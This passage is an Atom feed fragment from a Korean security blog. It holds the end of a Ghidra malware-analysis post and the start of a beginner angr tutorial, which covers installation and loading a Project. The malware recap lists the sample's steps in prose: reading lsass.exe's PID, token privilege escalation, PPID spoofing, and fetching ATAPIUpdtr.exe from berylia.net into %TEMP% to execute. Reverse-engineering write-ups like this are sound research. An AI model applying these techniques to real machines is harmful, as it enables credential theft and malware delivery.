title="&#xC815;&#xB9AC;"></a>&#xC815;&#xB9AC;</h1><p>&#xC790; &#xC774;&#xC81C; &#xC815;&#xB9AC;&#xB97C; &#xD574;&#xBD05;&#xC2DC;&#xB2E4;. &#xD07C;&#xC9C1;&#xD07C;&#xC9C1;&#xD55C; &#xD589;&#xC704;&#xB97C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC815;&#xB9AC;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC544;&#xC694;.</p><ol><li><code>lsass.exe</code>&#xC758; PID&#xB97C; &#xAC00;&#xC838;&#xC628;&#xB2E4;.</li><li>Token&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xAD8C;&#xD55C;&#xC744; &#xC0C1;&#xC2B9;&#xC2DC;&#xD0A8;&#xB2E4;.</li><li>PPID Spoofing&#xC744; &#xC9C4;&#xD589;&#xD55C;&#xB2E4;.</li><li><code>berylia.net</code>&#xC5D0;&#xC11C; <code>ATAPIUpdtr.exe</code>&#xB97C; <code>%TEMP%</code>&#xC5D0; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD55C;&#xB2E4;.</li><li>&#xC2E4;&#xD589;!</li></ol><p>&#xC5B4;&#x2026; &#xB108;&#xBB34; &#xAC04;&#xB2E8;&#xD558;&#xB124;&#xC694;. &#xD558;&#xD56B;! &#xC74C;&#x2026; <del>&#xC5B4;&#xB5BB;&#xAC8C; &#xB05D;&#xB0B4;&#xC57C; &#xD558;&#xC9C0;?</del> &#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xB294; &#xC800;&#xC758; &#xC608;&#xC0C1;&#xC774; &#xD2C0;&#xB9AC;&#xC9C0; &#xC54A;&#xC558;&#xC74C;&#xC744; &#xBCF4;&#xC5EC;&#xC8FC;&#xB294; &#xBD80;&#xBD84;&#xC774;&#xC5C8;&#xB358; &#xAC70; &#xAC19;&#xC544;&#xC694;. ghidra&#xC758; &#xD65C;&#xC6A9;&#xBC95;&#xC5D0; &#xC9D1;&#xC911;&#xD558;&#xAE30;&#xBCF4;&#xB2E4;&#xB294; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xC774; &#xC6B0;&#xC120;&#xC774; &#xB418;&#xC5C8;&#xB358; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. (&#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC774; &#xB611;&#xAC19;&#xC544;&#xC11C; &#xC5B4;&#xCA54; &#xC218; &#xC5C6;&#xC5B4;&#xC694;.) Malware analysis &#xD30C;&#xD2B8;&#xB97C; 1&#xB85C; &#xB05D;&#xB0C8;&#xC73C;&#xBA74; &#xC88B;&#xC558;&#xC744; &#xD150;&#xB370;&#x2026;</p><p>&#xC544;&#xBB34;&#xD2BC;! &#xADF8;&#xB798;&#xB3C4; &#xC624;&#xB7AB;&#xB3D9;&#xC548; &#xAE00;&#xC744; &#xC791;&#xC131;&#xD588;&#xB124;&#xC694;. &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xC168;&#xC73C;&#xBA74; &#xC88B;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;&#xB9CC;&#x2026; &#xC800;&#xB294; &#xBBF8;&#xAC1C;&#xD55C; &#xC2E4;&#xB825;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294; &#xC0AC;&#xB78C;&#xC774;&#xB77C;&#xC11C;&#x2026; &#x3160;&#x3160;&#x2026; ghidra &#xD30C;&#xD2B8;&#xB294; &#xB354; &#xB2E4;&#xB8F0; &#xBD80;&#xBD84;&#xC774; &#xC5C6;&#xB294; &#xAC83; &#xAC19;&#xC544; &#xC774;&#xC81C; &#xC885;&#xB8CC;&#xD558;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;! &#xB2E4;&#xB2E4;&#xC74C;&#xC8FC;&#xC5D0; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xBD84;&#xC11D; VM &#xC790;&#xB3D9;&#xD654;&#xC758; &#xB9C8;&#xC9C0;&#xB9C9; &#xD30C;&#xD2B8;&#xB3C4; &#xC5C5;&#xB85C;&#xB4DC;&#xB418;&#xB2C8; &#xAE30;&#xB2E4;&#xB824; &#xC8FC;&#xC138;&#xC6A9;~ &#xADF8;&#xB7FC; &#xC774;&#xB9CC;!</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>malware</tag>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>ghidra</tag>
      
      <tag>ransomware</tag>
      
      <tag>ghidra tutorials</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 핵린이의 angr 정복기 - (1) 시작</title>
    <link href="/2021/07/10/j0ker/angr_part1/"/>
    <url>/2021/07/10/j0ker/angr_part1/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xC778;&#xC0AC;&#xB9D0;"><a href="#&#xC778;&#xC0AC;&#xB9D0;" class="headerlink" title="&#xC778;&#xC0AC;&#xB9D0;"></a>&#xC778;&#xC0AC;&#xB9D0;</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! j0ker&#xC785;&#xB2C8;&#xB2E4;. &#xC544;&#xC9C1; &#xB0B4;&#xACF5;&#xC774; &#xB9CE;&#xC774; &#xBD80;&#xC871;&#xD574; &#xADF8;&#xB0E5; &#xACF5;&#xBD80;&#xB9CC; &#xD558;&#xACE0; &#xC788;&#xB2E4;&#xAC00; &#xC774;&#xC81C;&#xC57C; &#xACF5;&#xBD80;&#xD558;&#xACE0; &#xC788;&#xB294; &#xB0B4;&#xC6A9;&#xC744; &#xD3EC;&#xC2A4;&#xD305;&#xD574;&#xBCFC;&#xAE4C; &#xD569;&#xB2C8;&#xB2E4;!! &#xB0B4;&#xAC00; &#xC654;&#xB2E4;&#xC544;&#xC544;&#xC544;&#xC544;&#xC544;&#xC545;!!!!</p><p><img src="/2021/07/10/j0ker/angr_part1/1625546988.gif" alt="&#xB450;&#xB450;&#xB4F1;&#xC7A5;"></p><blockquote><p>&#xC6B0;&#xC544;&#xC528; &#xB5A8;&#xC5B4;&#xC9C8; &#xBED4;&#xD588;&#xB124;;;</p></blockquote><p>&#xC608;&#xC804;&#xC5D0; &#xD574;&#xD0B9;&#xD558;&#xAE30; &#xC804;&#xC5D0; &#xC601;&#xD654; &#xAC19;&#xC740;&#xAC70; &#xBCF4;&#xBA74; &#xD574;&#xCEE4;&#xB4E4;&#xC774; &#xB098;&#xC640;&#xC11C; &#xD0A4;&#xBCF4;&#xB4DC;&#xB97C; &#xCD24;&#xB77C;&#xB77C;&#xB77C;&#xB77D; &#xB204;&#xB974;&#xB354;&#xB2C8; &#xC9C0;&#xB3C4;&#xC5D0; &#xC810;&#xC774; &#xCC0D;&#xD788;&#xACE0; &#xCDE8;&#xC57D;&#xC810; &#xC54C;&#xC544;&#xC11C; &#xCC3E;&#xACE0; &#xACF5;&#xACA9;&#xAE4C;&#xC9C0; &#xD558;&#xB294; &#xC7A5;&#xBA74;&#xC744; &#xBCF8; &#xC801;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4; &#x314B;&#x314B;&#x314B;&#x314B; &#xC9C0;&#xAE08; &#xBCF4;&#xBA74; &#xB9D0;&#xC774; &#xC548;&#xB418;&#xB294;&#xB370; &#xB9D0;&#xC774;&#xC9C0;&#x2026; &#xADF8;&#xB798;&#xB3C4; &#xADF8; &#xB54C;&#xB294; &#xB450;&#xADFC;&#xB450;&#xADFC;&#xD558;&#xBA74;&#xC11C; &#x201C;&#xC624; &#xD574;&#xCEE4;&#xB294; &#xC815;&#xB9D0; &#xBA4B;&#xC9C0;&#xB2E4;&#x201D;&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xD588;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xB807;&#xAC8C; &#xC798;&#xBABB;&#xB41C; &#xAE38;&#xB85C; &#xB4E4;&#xC5B4;&#xC640; &#xBC84;&#xB838;&#xC8E0;&#x2026; &#xD5C8;&#xD5C8; &#xADF8; &#xB54C; &#xBA48;&#xCDC4;&#xC5B4;&#xC57C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/10/j0ker/angr_part1/2e17a20210794aa3b3831a38fad04184.jpeg" alt="2"></p><blockquote><p>&#xC598;&#xB3C4; &#xADF8; &#xB54C; &#x201C;&#xADF8; &#xBC18;&#xC9C0;&#x201D;&#xB9CC; &#xBC1B;&#xC9C0; &#xC54A;&#xC558;&#xB354;&#xB77C;&#xBA74;&#x2026;</p></blockquote><p>&#xC554;&#xD2BC; &#xC81C;&#xAC00; &#xBD24;&#xB358; &#xADF8; &#xC601;&#xD654; &#xC18D;&#xC5D0; &#xD574;&#xCEE4;&#xC5D0; &#xC880; &#xB354; &#xB2E4;&#xAC00;&#xAC08; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD574;&#xC904; &#xC218; &#xC788;&#xB294; &#xD234;&#xC774; &#xBC14;&#xB85C; angr&#xC774;&#xC9C0; &#xC54A;&#xC744;&#xAE4C; &#xC2F6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; angr&#xB97C; &#xACF5;&#xBD80;&#xD558;&#xB824;&#xACE0; &#xD558;&#xB2C8;&#xAE4C; &#xB2E4; &#xB77C;&#xC774;&#xD2B8;&#xC5C5;&#xB9CC; &#xC788;&#xC9C0; &#xCC98;&#xC74C;&#xBD80;&#xD130; &#xB05D;&#xAE4C;&#xC9C0; &#xB2E4;&#xB8E8;&#xB294; &#xB0B4;&#xC6A9;&#xC740; &#xBCC4;&#xB85C; &#xC5C6;&#xB354;&#xB77C;&#xAD6C;&#xC694;.(&#xC788;&#xC73C;&#xBA74; &#xB313;&#xAE00; &#xB0A8;&#xACA8;&#xC8FC;&#xC2DC;&#xBA74; &#xAC10;&#xC0AC;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xB0B4;&#xAC00; &#xBABB; &#xCC3E;&#xB294;&#xAC74;&#xAC00;&#x2026;?) &#xC2DC;&#xB9AC;&#xC988;&#xB97C; &#xC77C;&#xB2E8; 4&#xD3B8;&#xAE4C;&#xC9C0; &#xC4F8;&#xAE4C; &#xACE0;&#xBBFC;&#xD558;&#xACE0; &#xC788;&#xB294;&#xB370; &#xB0B4;&#xC6A9;&#xC744; &#xB2E4;&#xB8E8;&#xBA74;&#xC11C; &#xAC1C;&#xB150;&#xC801;&#xC778; &#xBD80;&#xBD84;&#xC774;&#xB098; &#xC798; &#xB2E4;&#xB8E8;&#xC9C0; &#xC54A;&#xB294; angr&#xC758; &#xAE30;&#xCD08;&#xC801;&#xC778; &#xB0B4;&#xC6A9;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xB610; &#xB2E4;&#xB8E8;&#xB2E4;&#xBCF4;&#xBA74; &#xAE38;&#xC5B4;&#xC9C8; &#xC218;&#xB3C4; &#xC788;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E;</p><p>&#xC0AC;&#xC2E4; &#xC774;&#xBBF8; &#xB9CE;&#xC774; &#xC720;&#xBA85;&#xD55C; &#xD234;&#xC774;&#xB77C; &#xC124;&#xBA85;&#xC774; &#xB354; &#xD544;&#xC694;&#xD560;&#xAE4C; &#xC2F6;&#xAE34;&#xD55C;&#xB370; &#xC624;&#xB298; &#xC900;&#xBE44;&#xD55C; &#xB0B4;&#xC6A9;&#xC740; &#xB9CE;&#xC9C0; &#xC54A;&#xC73C;&#xB2C8; &#xC8FC;&#xC800;&#xB9AC;&#xC8FC;&#xC800;&#xB9AC; &#xC124;&#xBA85;&#xC744; &#xD558;&#xACE0; &#xAC00;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4; ^^</p><h1 id="angr&#xB780;"><a href="#angr&#xB780;" class="headerlink" title="angr&#xB780;?"></a>angr&#xB780;?</h1><p>angr&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xD65C;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xBD84;&#xC11D; &#xD50C;&#xB7AB;&#xD3FC; &#xC785;&#xB2C8;&#xB2E4;. angr&#xAC00; &#xC720;&#xBA85;&#xD574;&#xC9C0;&#xAE30; &#xC2DC;&#xC791;&#xD55C; &#xAC83;&#xC740; 2015&#xB144; DARPA&#xC758; CGC(Cyber Grand Challenge)&#xAC00; &#xC2DC;&#xC791;&#xD558;&#xBA74;&#xC11C;&#xC8E0;. CGC&#xB294; &#xCC38;&#xC5EC;&#xD300;&#xC774; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC790;&#xB3D9; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xD234;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4; &#xC81C;&#xD55C; &#xC2DC;&#xAC04; &#xB0B4;&#xC5D0; &#xCD9C;&#xC81C;&#xB41C; &#xBB38;&#xC81C;&#xB4E4;&#xC5D0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xC74C;&#xC744; &#xC99D;&#xBA85;&#xD558;&#xACE0; &#xD328;&#xCE58;&#xD558;&#xB294; &#xC810;&#xC218;&#xB97C; &#xC5BB;&#xB294; &#xB300;&#xD68C; &#xC785;&#xB2C8;&#xB2E4;. &#xC77C;&#xBC18;&#xC801;&#xC778; CTF&#xC640;&#xB294; &#xB2E4;&#xB974;&#xC8E0;? angr&#xB97C; &#xC81C;&#xC791;&#xD55C; Shellphish&#xD300;&#xC774; &#xC774; &#xB300;&#xD68C;&#xC5D0; &#xCC38;&#xAC00;&#xD558;&#xC600;&#xACE0; 3&#xB4F1;&#xC744; &#xCC28;&#xC9C0;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB300;&#xD68C;&#xAC00; &#xB05D;&#xB098;&#xACE0; &#xC790;&#xB3D9; &#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D; &#xBD84;&#xC57C;&#xAC00; &#xD574;&#xCEE4;&#xB4E4;&#xC5D0;&#xAC8C; &#xB9CE;&#xC740; &#xC8FC;&#xBAA9;&#xC744; &#xBC1B;&#xC73C;&#xBA74;&#xC11C; angr&#xB77C;&#xB294; &#xD234; &#xC5ED;&#xC2DC; python&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD55C; &#xB192;&#xC740; &#xC811;&#xADFC;&#xC131; &#xB54C;&#xBB38;&#xC5D0; &#xB9CE;&#xC740; &#xC778;&#xAE30;&#xB97C; &#xB04C;&#xAE30; &#xC2DC;&#xC791;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB978; &#xD300;&#xB4E4;&#xC774; &#xC81C;&#xC791;&#xD55C; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xC790;&#xB3D9; &#xBD84;&#xC11D; &#xD234;&#xB4E4;&#xB3C4; &#xACF5;&#xAC1C;&#xB41C; &#xAC83;&#xB4E4;&#xC774; &#xC788;&#xC9C0;&#xB9CC; angr&#xAC00; python&#xC73C;&#xB85C; &#xD65C;&#xC6A9; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xC810;&#xACFC; &#xBB38;&#xC11C;&#xD654; &#xC798; &#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xB294; &#xC810;&#xC774; &#xD655;&#xC2E4;&#xD788; &#xB9E4;&#xB825;&#xC801;&#xC73C;&#xB85C; &#xB2E4;&#xAC00;&#xC624;&#xB294; &#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB2C8;&#xAE4C; &#xC800; &#xAC19;&#xC740; &#xD575;&#xB9B0;&#xC774;&#xB4E4;&#xB3C4; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xC790;&#xB3D9;&#xBD84;&#xC11D;&#xC744; &#xCC0D;&#xBA39;&#xD574;&#xBCFC; &#xC218; &#xC788;&#xB294;&#xAC70;&#xACA0;&#xC8E0;. CGC &#xC774;&#xD6C4;&#xB85C; &#xB9CE;&#xC740; CTF&#xC5D0;&#xC11C; &#xC790;&#xB3D9; &#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D; &#xBC0F; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xD639;&#xC740; &#xB9AC;&#xBC84;&#xC2F1; &#xBD84;&#xC57C;&#xC5D0;&#xC11C; angr&#xB97C; &#xD65C;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xBB38;&#xC81C;&#xB4E4;&#xC774; &#xB098;&#xC624;&#xACE0; &#xD574;&#xCEE4;&#xB4E4;&#xC774; angr&#xB97C; &#xC775;&#xC219;&#xD558;&#xAC8C; &#xB2E4;&#xB8F0; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xBA74;&#xC11C; &#xBCF4;&#xD3B8;&#xC801;&#xC73C;&#xB85C; &#xB9CE;&#xC774; &#xC4F0;&#xC774;&#xAC8C; &#xB41C; &#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.(&#xCE74;&#xB354;&#xB77C;)</p><p>angr, CGC, shellphish&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC880; &#xB354; &#xC790;&#xC138;&#xD558;&#xAC8C; &#xC54C;&#xACE0; &#xC2F6;&#xC73C;&#xC2DC;&#xB2E4;&#xBA74; &#xC544;&#xB798; &#xB9C1;&#xD06C;&#xB97C; &#xCC38;&#xACE0;&#xD574;&#xBCF4;&#xC2DC;&#xBA74; &#xC88B;&#xC744;&#xB4EF; &#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><a href="https://cpuu.postype.com/post/4127178">[&#xBC88;&#xC5ED;] 2016 DARPA CGC &#xB300;&#xD68C; &#xCD9C;&#xC804;&#xD300;&#xC758; &#xD68C;&#xACE0;</a></li><li><a href="https://shellphish.net/cgc/">The Cyber Grand Challenge</a></li><li><a href="http://kaishackgon.blogspot.com/2016/08/cyber-grand-challenge.html">Cyber Grand Challenge &#xD6C4;&#xAE30;</a></li><li><a href="https://www.krcert.or.kr/data/trendView.do?bulletin_writing_sequence=20050">&#x7F8E; &#xBC29;&#xC704;&#xACE0;&#xB4F1;&#xC5F0;&#xAD6C;&#xACC4;&#xD68D;&#xAD6D;(DARPA)&#xC758; &#xC0AC;&#xC774;&#xBC84; &#xC790;&#xB3D9; &#xBC29;&#xC5B4;&#xC2DC;&#xC2A4;&#xD15C; &#xAC1C;&#xBC1C;&#xC744; &#xC704;&#xD55C; &#xCEE8;&#xD14C;&#xC2A4;&#xD2B8;(CGC) &#xAC1C;&#xCD5C;</a></li></ul><h1 id="angr-&#xC124;&#xCE58;"><a href="#angr-&#xC124;&#xCE58;" class="headerlink" title="angr &#xC124;&#xCE58;"></a>angr &#xC124;&#xCE58;</h1><p>&#xC704;&#xC5D0;&#xC11C; &#xB9D0;&#xC500;&#xB4DC;&#xB838;&#xB2E4;&#xC2DC;&#xD53C; angr&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xD65C;&#xC6A9; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xAC8C; &#xBB54; &#xB9D0;&#xC774;&#xB0D0;? python&#xB9CC; &#xAE54;&#xB9AC;&#xBA74; &#xB2E4; &#xC4F8; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;! &#xB2E4; &#xC4F8; &#xC218; &#xC788;&#xB2E4;&#xACE0;&#xB294; &#xD558;&#xC9C0;&#xB9CC; &#xC800;&#xD76C;&#xB294; &#xC77C;&#xB2E8; &#xC6B0;&#xBD84;&#xD22C;&#xC5D0;&#xC11C; angr&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; &#xC544;&#xB798; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD574;&#xC11C; &#xC2E4;&#xD589;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xC694;&#xC18C;&#xB4E4;&#xC744; &#xC124;&#xCE58;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">sudo apt-get install python3-dev libffi-dev build-essential virtualenvwrapper</code></pre><p>&#xADF8;&#xB9AC;&#xACE0; &#xB2E4;&#xB978; &#xBAA8;&#xB4C8;&#xACFC;&#xC758; &#xBC84;&#xC804; &#xCDA9;&#xB3CC;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; virtualenv&#xB97C; &#xB9CC;&#xB4E4;&#xACE0; &#xADF8; &#xC548;&#xC5D0; angr&#xB97C; &#xC124;&#xCE58;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">mkvirtualenv --python=$(<span class="hljs-built_in">which</span> python3) angr &amp;&amp; pip install angr</code></pre><p>&#xB9CC;&#xC57D; &#xC124;&#xCE58;&#xAC00; &#xC798; &#xC548;&#xB41C;&#xB2E4;!!! &#xADF8;&#xB7EC;&#xBA74; &#xC815;&#xC9C1;&#xD558;&#xAC8C; <a href="https://docs.angr.io/introductory-errata/install">&#xC624;&#xD53C;&#xC15C; &#xBB38;&#xC11C;</a>&#xB97C; &#xCC38;&#xACE0;&#xD574;&#xC8FC;&#xC138;&#xC694;.</p><h1 id="angr-&#xD1BA;&#xC544;&#xBCF4;&#xAE30;"><a href="#angr-&#xD1BA;&#xC544;&#xBCF4;&#xAE30;" class="headerlink" title="angr &#xD1BA;&#xC544;&#xBCF4;&#xAE30;"></a>angr &#xD1BA;&#xC544;&#xBCF4;&#xAE30;</h1><p>&#xC774;&#xC81C; angr&#xB97C; &#xC5B4;&#xB5BB;&#xAC8C; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBD10;&#xC57C;&#xACA0;&#xC8E0;? &#xC624;&#xB298;&#xC740; &#xC815;&#xB9D0; &#xADF8;&#xB0E5; &#xC774;&#xB7F0;&#xAC8C; &#xC788;&#xAD6C;&#xB098;~ &#xC815;&#xB3C4;&#xB9CC; &#xBCF4;&#xACE0; &#xB2E4;&#xC74C;&#xC5D0; &#xC880; &#xB354; &#xC790;&#xC138;&#xD558;&#xAC8C; &#xC55E;&#xC73C;&#xB85C; &#xB2E4;&#xB904;&#xBCFC; &#xC608;&#xC2DC; &#xBB38;&#xC81C; &#xC0C1;&#xD669;&#xC5D0; &#xB530;&#xB77C; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Project"><a href="#Project" class="headerlink" title="Project"></a>Project</h2><p>&#xC77C;&#xB2E8; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> angr<span class="hljs-meta">&gt;&gt;&gt; </span>proj = angr.Project(<span class="hljs-string">&apos;00_angr_find&apos;</span>)</code></pre><p>&#xC774;&#xB807;&#xAC8C; &#xD558;&#xBA74; &#xD0C0;&#xAC9F; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xB300;&#xD55C; Project &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xAC00; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xAC00; angr&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#xAE30;&#xBCF8; &#xB2E8;&#xC704;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xB300;&#xD55C; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xC815;&#xBCF4;&#xB4E4;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.arch&lt;Arch X86 (LE)&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>proj.entry<span class="hljs-number">134513744</span><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> monkeyhex<span class="hljs-meta">&gt;&gt;&gt; </span>proj.entry<span class="hljs-number">0x8048450</span></code></pre><p>&#xC911;&#xAC04;&#xC5D0; monkeyhex&#xB97C; import&#xD558;&#xBA74; &#xADF8;&#xB0E5; 10&#xC9C4;&#xC218;&#xB85C; &#xCD9C;&#xB825;&#xB418;&#xB294; &#xAC12;&#xB4E4;&#xC774; 16&#xC9C4;&#xC218;&#xB85C; &#xCD9C;&#xB825;&#xB418;&#xC11C; &#xC880; &#xB354; &#xD3B8;&#xD558;&#xAC8C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB2F9;&#xC5F0;&#xD788; &#xC774; &#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xB2E4;&#xB978; &#xC815;&#xBCF4;&#xB4E4;&#xB3C4; &#xC788;&#xACA0;&#xC8E0;! &#xD568; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.__dict__{<span class="hljs-string">&apos;filename&apos;</span>: <span class="hljs-string">&apos;00_angr_find&apos;</span>, <span class="hljs-string">&apos;loader&apos;</span>: &lt;Loaded <span class="hljs-number">00</span>_angr_find, maps [<span class="hljs-number">0x8048000</span>:<span class="hljs-number">0x8407fff</span>]&gt;, <span class="hljs-string">&apos;arch&apos;</span>: &lt;Arch X86 (LE)&gt;, <span class="hljs-string">&apos;_sim_procedures&apos;</span>: {<span class="hljs-number">0x8100000</span>: &lt;SimProcedure strcmp&gt;,  <span class="hljs-number">0x8100004</span>: &lt;SimProcedure printf&gt;,  <span class="hljs-number">0x8100008</span>: &lt;SimProcedure __stack_chk_fail&gt;,  <span class="hljs-number">0x810000c</span>: &lt;SimProcedure puts&gt;,  <span class="hljs-number">0x8100010</span>: &lt;SimProcedure exit&gt;,  <span class="hljs-number">0x8100014</span>: &lt;SimProcedure __libc_start_main&gt;,  <span class="hljs-number">0x8100018</span>: &lt;SimProcedure __isoc99_scanf&gt;,  <span class="hljs-number">0x10301000</span>: &lt;SimProcedure LinuxLoader&gt;,  <span class="hljs-number">0x10301008</span>: &lt;SimProcedure _dl_rtld_lock_recursive&gt;,  <span class="hljs-number">0x10301010</span>: &lt;SimProcedure _dl_rtld_unlock_recursive&gt;,  <span class="hljs-number">0x10301018</span>: &lt;SimProcedure ReturnUnconstrained&gt;,  <span class="hljs-number">0x10301020</span>: &lt;SimProcedure _dl_initial_error_catch_tsd&gt;,  <span class="hljs-number">0x10301028</span>: &lt;SimProcedure _vsyscall&gt;,  <span class="hljs-number">0x10301038</span>: &lt;SimProcedure CallReturn&gt;,  <span class="hljs-number">0x10301040</span>: &lt;SimProcedure UnresolvableJumpTarget&gt;,  <span class="hljs-number">0x10301048</span>: &lt;SimProcedure UnresolvableCallTarget&gt;}, <span class="hljs-string">&apos;concrete_target&apos;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&apos;_default_analysis_mode&apos;</span>: <span class="hljs-string">&apos;symbolic&apos;</span>, <span class="hljs-string">&apos;_exclude_sim_procedures_func&apos;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&apos;_exclude_sim_procedures_list&apos;</span>: (), <span class="hljs-string">&apos;use_sim_procedures&apos;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&apos;_ignore_functions&apos;</span>: [], <span class="hljs-string">&apos;_support_selfmodifying_code&apos;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&apos;_translation_cache&apos;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&apos;_executing&apos;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&apos;entry&apos;</span>: <span class="hljs-number">0x8048450</span>, <span class="hljs-string">&apos;storage&apos;</span>: {}, <span class="hljs-string">&apos;store_function&apos;</span>: &lt;bound method Project._store of &lt;Project \\\\Mac\\Home\\Desktop\\Angr_Tutorial_For_CTF\\problems\\<span class="hljs-number">00</span>_angr_find&gt;&gt;, <span class="hljs-string">&apos;load_function&apos;</span>: &lt;function Project._load at <span class="hljs-number">0x00000225ECEF2CA0</span>&gt;, <span class="hljs-string">&apos;factory&apos;</span>: &lt;angr.factory.AngrObjectFactory object at <span class="hljs-number">0x00000225ECEF4100</span>&gt;, <span class="hljs-string">&apos;_analyses_preset&apos;</span>: <span class="hljs-literal">None</span>, <span 